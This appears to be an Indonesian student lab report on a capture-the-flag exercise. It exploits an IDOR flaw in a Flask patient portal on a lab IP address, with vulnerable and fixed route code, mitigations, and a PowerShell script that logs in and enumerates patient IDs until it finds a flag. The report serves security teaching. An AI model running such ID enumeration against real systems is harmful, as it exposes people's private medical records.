## I. TUJUAN PRAKTIKUM

Setelah menyelesaikan praktikum ini, mahasiswa diharapkan mampu:
1. Menjelaskan konsep dasar kerentanan *Insecure Direct Object References* (IDOR) dan *Broken Access Control* pada aplikasi web.
2. Melakukan identifikasi, pengujian otorisasi, dan eksploitasi parameter URL pada aplikasi web portal pasien.
3. Menganalisis *root cause* celah otorisasi di sisi server-side serta menyusun rekomendasi mitigasi keamanan yang komprehensif.


## II. DASAR TEORI

### 2.1 Pengenalan Insecure Direct Object References (IDOR)
*Insecure Direct Object References* (IDOR) terjadi ketika aplikasi web menggunakan input yang dikontrol oleh pengguna (*user-controlled key*) untuk mengakses objek database secara langsung tanpa adanya pemeriksaan otorisasi (*authorization check*) di sisi server. Kerentanan ini termasuk dalam kategori **OWASP Top 10 A01:2021 – Broken Access Control** dan **CWE-639**.

### 2.2 Autentikasi vs Otorisasi
- **Autentikasi (Siapa Kamu?):** Memverifikasi identitas pengguna (misalnya melalui login menggunakan username dan password).
- **Otorisasi (Apa yang Boleh Kamu Akses?):** Memastikan pengguna yang sudah terautentikasi hanya memiliki hak akses terhadap data/sumber daya miliknya sendiri.

Pada kasus IDOR, proses autentikasi berhasil dilakukan (pengguna memiliki session valid), namun mekanisme otorisasi gagal memverifikasi apakah `patient_id` pada session cookie sesuai dengan `id` pasien yang diminta pada URL.

### 2.3 Alat dan Bahan
- **Sistem Operasi:** Windows 11 / Kali Linux
- **Aplikasi / Tools:** Web Browser, Developer Tools (Network/Cookies), PowerShell / Terminal
- **Platform Target:** Flask (Werkzeug/3.0.3, Python 3.11.15) — `http://172.16.92.212:5007`
- **Kredensial Demo:** `rofiq.fauzi` / `password123`


## III. LANGKAH KERJA DAN HASIL PRAKTIKUM

1. Melakukan pengujian awal (*Reconnaissance*) pada halaman utama `http://172.16.92.212:5007/` untuk mengidentifikasi form login dan melakukan enumerasi path umum (`/robots.txt`, `/admin`, `/.git/HEAD`). Semua path menghasilkan status 404.

   ![Halaman Login Portal Pasien](<assets/ss/Screenshot 2026-10-01 151912.png>)

2. Melakukan autentikasi menggunakan akun demo (`rofiq.fauzi` / `password123`) untuk mendapatkan session cookie yang valid.

   ![Autentikasi Akun Demo](<assets/ss/Screenshot 2026-10-01 152109.png>)

3. Memeriksa cookie session yang diterima (`session=eyJwYXRpZW50X2lkIjoxMDUs...`). Setelah di-decode dari format Base64 URL-safe, diperoleh data payload: `{"patient_id":105, "user":"rofiq.fauzi"}`.

   ![Inspeksi Session Cookie](<assets/ss/Screenshot 2026-10-01 152959.png>)

4. Melakukan pengujian kerentanan IDOR (*Hypothesis Testing*) dengan mengubah nilai ID pada URL dari `/patient/105` menjadi ID pasien lainnya (`/patient/1` hingga `/patient/110`).

   ![Enumerasi Endpoint Patient](assets/ss/Screenshot 2026-10-01 160038.png)

5. Mengakses record VIP pada `/patient/1` (Dr. Richard Vane) dan mengekstraksi flag rahasia yang tersembunyi pada elemen **Physician Notes**.

   ![Pencapaian Flag IDOR](assets/ss/Screenshot 2026-10-01 160059.png)


## IV. PEMBAHASAN DAN ANALISIS

### 4.1 Analisis Kerentanan
Berdasarkan hasil pengujian pada Bab III, ditemukan bahwa server mempercayai secara mentah (*blindly trust*) parameter `pid` dari path URL `/patient/<int:pid>` tanpa membandingkan nilainya dengan `session["patient_id"]`.

### Perbandingan Kode (Vulnerable vs Secure):

```python
# VULNERABLE (Kondisi Sistem Target)
@app.route("/patient/<int:pid>")
def patient(pid):
    if "patient_id" not in session:
        return redirect("/login")
    return render(record=get_record(pid))   # Parameter pid bebas diubah!

# SECURE (Rekomendasi Perbaikan)
@app.route("/patient/<int:pid>")
def patient(pid):
    if session.get("patient_id") != pid:     # Validasi kepemilikan data
        abort(403)                           # Tolak akses jika ID tidak cocok
    return render(record=get_record(pid))
```

## 4.2 Proof of Concept (Otomatisasi Script)
Berikut adalah script PowerShell yang digunakan untuk melakukan brute-force enumerasi ID secara otomatis hingga flag berhasil ditemukan:

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest "http://172.16.92.212:5007/" -WebSession $s -UseBasicParsing | Out-Null
Invoke-WebRequest "http://172.16.92.212:5007/login" -Method POST `
    -Body @{username="rofiq.fauzi";password="password123"} `
    -WebSession $s -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue | Out-Null

foreach ($i in 1..110) {
    $r = Invoke-WebRequest "http://172.16.92.212:5007/patient/$i" -WebSession $s -UseBasicParsing
    if ($r.Content -match 'flag-box') { "FLAG pada ID $i : $($matches[1])" }
}
```

### 4.3 Dampak dan Rekomendasi Mitigasi
- **Dampak:** Penyerang dapat melihat data sensitif PII (*Personally Identifiable Information*) milik seluruh pasien lain, termasuk rekam medis VIP.
- **Rekomendasi Mitigasi:**
  1. Selalu lakukan validasi otorisasi di *server-side* pada setiap pengaksesan resource.
  2. Gunakan identifier yang tidak mudah ditebak seperti **UUIDv4** alih-alih ID numerik berurutan.
  3. Terapkan prinsip *Least Privilege* dan *Deny by Default*.


## V. KESIMPULAN

Berdasarkan praktikum pengujian keamanan yang telah dilaksanakan, dapat disimpulkan bahwa:
1. Aplikasi Patient Portal terbukti memiliki kerentanan **IDOR (Insecure Direct Object References)** pada endpoint `/patient/<id>` karena ketiadaan pengecekan otorisasi di sisi server.
2. Flag `CYBERSAFE{1d0r_h0sp1t4l_br34ch}` berhasil didapatkan dengan mengakses ID tersembunyi (`ID 1`) yang menyimpan data rekam medis VIP.
3. Kerentanan ini dapat dimitigasi secara efektif dengan menambahkan pengecekan kesesuaian antara `session["patient_id"]` dengan ID objek yang diminta pada logika backend server.